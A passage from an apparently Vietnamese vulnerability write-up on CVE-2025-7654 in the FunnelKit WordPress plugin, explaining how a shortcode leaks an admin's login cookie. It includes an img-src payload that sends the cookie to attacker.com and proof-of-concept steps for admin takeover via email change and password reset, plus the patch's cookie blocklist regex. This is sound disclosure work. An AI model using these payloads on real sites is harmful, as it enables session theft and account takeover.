bi·∫øn &lt;code&gt;$data&lt;/code&gt;. &lt;strong&gt;N·∫øu &lt;code&gt;$data&lt;/code&gt; kh√¥ng r·ªóng&lt;/strong&gt;, h√†m s·∫Ω b·ªè qua ho√†n to√†n nh√°nh ƒë·ªçc t·ª´ &lt;code&gt;$_GET&lt;/code&gt; v√† &lt;strong&gt;tr·∫£ v·ªÅ tr·ª±c ti·∫øp gi√° tr·ªã cookie ƒë√≥&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;V√≠ d·ª•, khi shortcode sau ƒë∆∞·ª£c nh√∫ng v√†o m·ªôt b√†i vi·∫øt:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi m·ªôt ng∆∞·ªùi d√πng &lt;strong&gt;ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt; truy c·∫≠p b√†i vi·∫øt n√†y, shortcode s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω ·ªü ph√≠a server v√† gi√° tr·ªã cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; c·ªßa &lt;strong&gt;ch√≠nh ng∆∞·ªùi ƒëang xem trang&lt;/strong&gt; s·∫Ω ƒë∆∞·ª£c render th·∫≥ng v√†o n·ªôi dung b√†i vi·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#34; title=&#34;Cookie ƒë∆∞·ª£c hi·ªÉn th·ªã trong post&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie ƒë∆∞·ª£c hi·ªÉn th·ªã trong post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;631&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie ƒë∆∞·ª£c hi·ªÉn th·ªã trong post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tho·∫°t nh√¨n, ƒëi·ªÅu n√†y c√≥ v·∫ª ‚Äúv√¥ h·∫°i‚Äù, v√¨ m·ªói ng∆∞·ªùi ch·ªâ th·∫•y cookie c·ªßa &lt;strong&gt;ch√≠nh m√¨nh&lt;/strong&gt;. Tuy nhi√™n, v·∫•n ƒë·ªÅ n·∫±m ·ªü ch·ªó: shortcode kh√¥ng ch·ªâ c√≥ th·ªÉ hi·ªÉn th·ªã vƒÉn b·∫£n, m√† c√≤n c√≥ th·ªÉ ƒë∆∞·ª£c nh√∫ng v√†o &lt;strong&gt;c√°c thu·ªôc t√≠nh HTML&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;K·∫ª t·∫•n c√¥ng v·ªõi quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; c√≥ th·ªÉ ch√®n shortcode v√†o thu·ªôc t√≠nh &lt;code&gt;src&lt;/code&gt; c·ªßa m·ªôt th·∫ª &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;strong&gt;qu·∫£n tr·ªã vi√™n (admin)&lt;/strong&gt; ƒëƒÉng nh·∫≠p v√† m·ªü b√†i vi·∫øt n√†y, shortcode s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω, cookie ƒëƒÉng nh·∫≠p c·ªßa admin s·∫Ω b·ªã ch√®n tr·ª±c ti·∫øp v√†o URL c·ªßa ·∫£nh. Tr√¨nh duy·ªát sau ƒë√≥ s·∫Ω g·ª≠i m·ªôt request t·ªõi server c·ªßa attacker, v√¥ t√¨nh mang theo &lt;strong&gt;cookie x√°c th·ª±c c·ªßa admin&lt;/strong&gt; trong ƒë∆∞·ªùng d·∫´n.&lt;/p&gt;&#xA;&lt;p&gt;üëâ Ch√≠nh t·∫°i th·ªùi ƒëi·ªÉm n√†y, cookie kh√¥ng c√≤n ‚Äúch·ªâ hi·ªÉn th·ªã cho ng∆∞·ªùi xem‚Äù n·ªØa, m√† ƒë√£ b·ªã &lt;strong&gt;r√≤ r·ªâ ra b√™n ngo√†i&lt;/strong&gt;, m·ªü ƒë∆∞·ªùng cho vi·ªác chi·∫øm quy·ªÅn ƒëƒÉng nh·∫≠p v√† leo thang ƒë·∫∑c quy·ªÅn.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, ta c·∫ßn ph·∫£i n·∫Øm ƒë∆∞·ª£c cookie n√†o nguy hi·ªÉm ƒë·ªÉ khai th√°c.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; title=&#34;Cookie ƒë∆∞·ª£c set khi login th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie ƒë∆∞·ª£c set khi login th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#39; alt=&#34;Cookie&#34; height=&#34;797&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie ƒë∆∞·ª£c set khi login th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p th√†nh c√¥ng v√†o WordPress, h·ªá th·ªëng s·∫Ω thi·∫øt l·∫≠p hai cookie x√°c th·ª±c ch√≠nh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: √°p d·ª•ng cho c√°c ƒë∆∞·ªùng d·∫´n &lt;code&gt;/wp-content/plugins&lt;/code&gt; v√† &lt;code&gt;/wp-admin&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: √°p d·ª•ng cho ƒë∆∞·ªùng d·∫´n &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong ƒë√≥, chu·ªói &lt;code&gt;86a9106ae65537651a8e456835b316ab&lt;/code&gt; l√† &lt;strong&gt;gi√° tr·ªã hash ƒë∆∞·ª£c t·∫°o t·ª´ URL c·ªßa website&lt;/strong&gt;, c·ª• th·ªÉ l√† &lt;code&gt;md5(&#39;http://localhost&#39;)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Theo chu·∫©n &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.2.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, m·ª•c &lt;strong&gt;5.2.4 ‚Äì Path Attribute&lt;/strong&gt;, chu·∫©n n√†y quy ƒë·ªãnh c√°ch tr√¨nh duy·ªát x·ª≠ l√Ω thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt; c·ªßa cookie:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#34; title=&#34;Path theo chu·∫©n RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/path.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Path theo chu·∫©n RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#39; alt=&#34;Path&#34; height=&#34;354&#34; width=&#34;757&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Path theo chu·∫©n RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt; x√°c ƒë·ªãnh &lt;strong&gt;ph·∫°m vi ƒë∆∞·ªùng d·∫´n (URL path)&lt;/strong&gt; m√† cookie s·∫Ω ƒë∆∞·ª£c g·ª≠i k√®m trong c√°c request HTTP.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Nh·∫≠n di·ªán thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt;&lt;/strong&gt;: N·∫øu t√™n thu·ªôc t√≠nh (kh√¥ng ph√¢n bi·ªát ch·ªØ hoa/th∆∞·ªùng) l√† &lt;code&gt;Path&lt;/code&gt;, tr√¨nh duy·ªát ph·∫£i x·ª≠ l√Ω cookie theo c√°c quy t·∫Øc b√™n d∆∞·ªõi.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr∆∞·ªùng h·ª£p &lt;code&gt;Path&lt;/code&gt; r·ªóng ho·∫∑c kh√¥ng h·ª£p l·ªá&lt;/strong&gt; (kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng k√Ω t·ª± &lt;code&gt;/&lt;/code&gt;):&#xA;Tr√¨nh duy·ªát s·∫Ω g√°n &lt;code&gt;cookie-path&lt;/code&gt; b·∫±ng &lt;strong&gt;default-path&lt;/strong&gt;, t·ª©c l√† ƒë∆∞·ªùng d·∫´n m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c suy ra t·ª´ URL ƒë√£ t·∫°o cookie.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#34; title=&#34;default-path theo chu·∫©n RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Default&lt;/h2&gt;&lt;p&gt;default-path theo chu·∫©n RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#39; alt=&#34;Default&#34; height=&#34;860&#34; width=&#34;771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;default-path theo chu·∫©n RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo m·ª•c &lt;strong&gt;5.1.4 ‚Äì Paths and Path-Match&lt;/strong&gt; c·ªßa &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.1.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, &lt;code&gt;default-path&lt;/code&gt; ƒë∆∞·ª£c t√≠nh nh∆∞ sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;uri-path&lt;/code&gt;: L·∫•y ph·∫ßn &lt;strong&gt;path&lt;/strong&gt; c·ªßa &lt;code&gt;request-uri&lt;/code&gt; (kh√¥ng bao g·ªìm query string).&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;uri-path&lt;/code&gt; r·ªóng ho·∫∑c kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;default-path&lt;/code&gt; l√† &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;uri-path&lt;/code&gt; ch·ªâ ch·ª©a m·ªôt d·∫•u &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;default-path&lt;/code&gt; l√† &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trong c√°c tr∆∞·ªùng h·ª£p c√≤n l·∫°i, &lt;code&gt;default-path&lt;/code&gt; l√† ph·∫ßn ƒë∆∞·ªùng d·∫´n t·ª´ ƒë·∫ßu &lt;code&gt;uri-path&lt;/code&gt; ƒë·∫øn tr∆∞·ªõc d·∫•u &lt;code&gt;/&lt;/code&gt; ngo√†i c√πng b√™n ph·∫£i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr∆∞·ªùng h·ª£p &lt;code&gt;Path&lt;/code&gt; h·ª£p l·ªá&lt;/strong&gt; (b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt;):&#xA;Tr√¨nh duy·ªát s·∫Ω s·ª≠ d·ª•ng tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;Path&lt;/code&gt; n√†y l√†m ph·∫°m vi √°p d·ª•ng c·ªßa cookie.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sau khi x√°c ƒë·ªãnh &lt;code&gt;cookie-path&lt;/code&gt;, tr√¨nh duy·ªát s·∫Ω l∆∞u cookie k√®m theo thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt; t∆∞∆°ng ·ª©ng v√† ch·ªâ g·ª≠i cookie n√†y trong c√°c request c√≥ URL path ph√π h·ª£p.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;K·ªãch b·∫£n t·∫•n c√¥ng c·ªßa l·ªó h·ªïng n√†y c√≥ th·ªÉ x·∫£y ra trong hai tr∆∞·ªùng h·ª£p:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Qu·∫£n tr·ªã vi√™n truy c·∫≠p b√†i vi·∫øt &lt;strong&gt;ch∆∞a ƒë∆∞·ª£c publish&lt;/strong&gt; th√¥ng qua endpoint &lt;code&gt;/?p=354&amp;amp;preview=true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Qu·∫£n tr·ªã vi√™n truy c·∫≠p b√†i vi·∫øt &lt;strong&gt;ƒë√£ ƒë∆∞·ª£c publish&lt;/strong&gt; th√¥ng qua endpoint &lt;code&gt;/ten-post&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong c·∫£ hai tr∆∞·ªùng h·ª£p tr√™n, &lt;strong&gt;ch·ªâ cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; ƒë∆∞·ª£c g·ª≠i k√®m theo request&lt;/strong&gt;, do cookie n√†y ƒë∆∞·ª£c thi·∫øt l·∫≠p v·ªõi &lt;code&gt;Path=/&lt;/code&gt; v√† √°p d·ª•ng cho to√†n b·ªô website.&lt;/p&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y ta kh√¥ng c√≥ gi√° tr·ªã c·ªßa cookie &lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt; ƒë·ªÉ truy c·∫≠p trang qu·∫£n tr·ªã (&lt;code&gt;/wp-admin&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n ta v·∫´n c√≥ th·ªÉ t·∫•n c√¥ng theo c√°ch kh√°c b·∫±ng cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; ƒë·ªÉ truy c·∫≠p &lt;code&gt;/wp-admin&lt;/code&gt; :)))&lt;/p&gt;&#xA;&lt;p&gt;Khi setup &lt;strong&gt;FunnelKit&lt;/strong&gt; c√πng &lt;strong&gt;WooCommerce&lt;/strong&gt;, endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng l√†m trang frontend cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt; ch·ªânh s·ª≠a th√¥ng tin t√†i kho·∫£n, v√† t·∫°i ƒë√¢y cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; lu√¥n ƒë∆∞·ª£c g·ª≠i k√®m theo request do ƒë∆∞·ª£c thi·∫øt l·∫≠p v·ªõi &lt;code&gt;Path=/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#34; title=&#34;Edit profile&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Edit profile&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#39; alt=&#34;Path&#34; height=&#34;1076&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit profile&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÉm ƒë√°ng ch√∫ √Ω l√† khi thay ƒë·ªïi email t√†i kho·∫£n, h·ªá th·ªëng &lt;strong&gt;kh√¥ng y√™u c·∫ßu nh·∫≠p l·∫°i m·∫≠t kh·∫©u hay x√°c th·ª±c b·ªï sung&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ &lt;strong&gt;thay ƒë·ªïi email c·ªßa t√†i kho·∫£n admin sang email do attacker ki·ªÉm so√°t&lt;/strong&gt;. Sau ƒë√≥, attacker ch·ªâ c·∫ßn s·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;forgot password&lt;/strong&gt; ƒë·ªÉ ƒë·∫∑t m·∫≠t kh·∫©u m·ªõi v√† ƒëƒÉng nh·∫≠p v·ªõi quy·ªÅn qu·∫£n tr·ªã vi√™n.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;B·∫£n v√° trong &lt;strong&gt;v3.12.0&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch &lt;strong&gt;gi·ªõi h·∫°n c√°c cookie nh·∫°y c·∫£m kh√¥ng cho ph√©p truy c·∫≠p th√¥ng qua shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;C·ª• th·ªÉ, plugin b·ªï sung m·ªôt danh s√°ch c√°c m·∫´u cookie b·ªã ch·∫∑n th√¥ng qua bi·∫øn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $restricted_cookie_pattern = &amp;#34;/^(wordpress_.*|_fk_contact_uid|wp-settings-.*|PHPSESSID|wordpress_logged_in_.*|wp_woocommerce_session_.*)$/&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;get_cookie&lt;/code&gt;, tr∆∞·ªõc khi ƒë·ªçc d·ªØ li·ªáu t·ª´ &lt;code&gt;$_COOKIE&lt;/code&gt;, plugin th·ª±c hi·ªán ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (preg_match($this-&amp;gt;restricted_cookie_pattern, $attr[&amp;#39;key&amp;#39;])) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† n·∫øu key c·ªßa cookie kh·ªõp v·ªõi c√°c pattern nh·∫°y c·∫£m nh∆∞:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp-settings-*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;PHPSESSID&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_woocommerce_session_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;th√¨ h√†m s·∫Ω &lt;strong&gt;tr·∫£ v·ªÅ r·ªóng&lt;/strong&gt; v√† &lt;strong&gt;kh√¥ng cho ph√©p ƒë·ªçc gi√° tr·ªã cookie&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; kh√¥ng c√≤n kh·∫£ nƒÉng truy xu·∫•t cookie x√°c th·ª±c c·ªßa WordPress ho·∫∑c WooCommerce, qua ƒë√≥ &lt;strong&gt;ngƒÉn ch·∫∑n ho√†n to√†n k·ªãch b·∫£n r√≤ r·ªâ cookie v√† privilege escalation&lt;/strong&gt; ƒë√£ ƒë∆∞·ª£c khai th√°c ·ªü c√°c phi√™n b·∫£n tr∆∞·ªõc.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Contributor)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Create / Edit Post&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Insert shortcode wf_get_cookie into HTML attribute (img src)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Post saved (draft or published)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Admin visits post (preview or published URL)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;WordPress processes shortcode server-side&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;wf_get_cookie reads wordpress_logged_in_* from $_COOKIE&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Cookie value rendered into HTML output&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Browser loads external resource (attacker.com)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Admin authentication cookie leaked via URL&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker captures wordpress_logged_in_* cookie&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker sets stolen cookie in browser&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Access /my-account/edit-account/ as Admin&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Change admin email without re-authentication&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Trigger forgot password flow&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Reset password via attacker-controlled email&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Full admin account takeover&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ƒêƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n &lt;strong&gt;Contributor&lt;/strong&gt; v√† t·∫°o m·ªôt b√†i vi·∫øt m·ªõi v·ªõi n·ªôi dung:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=wordpress_logged_in_md5(your_site_url)]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Khi qu·∫£n tr·ªã vi√™n truy c·∫≠p b√†i vi·∫øt n√†y, tr√¨nh duy·ªát s·∫Ω g·ª≠i request t·ªõi &lt;code&gt;attacker.com&lt;/code&gt;, k√®m theo gi√° tr·ªã cookie ƒë∆∞·ª£c render trong URL. Attacker thu th·∫≠p cookie t·ª´ request ƒë√≥.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; title=&#34;Cookie t·ª´ request&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie t·ª´ request&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;148&#34; width=&#34;1509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie t·ª´ request&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Attacker truy c·∫≠p endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; v√† thay th·∫ø cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; c·ªßa m√¨nh b·∫±ng cookie c·ªßa admin v·ª´a thu ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán thay ƒë·ªïi email t√†i kho·∫£n sang ƒë·ªãa ch·ªâ email do attacker ki·ªÉm so√°t.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;forgot 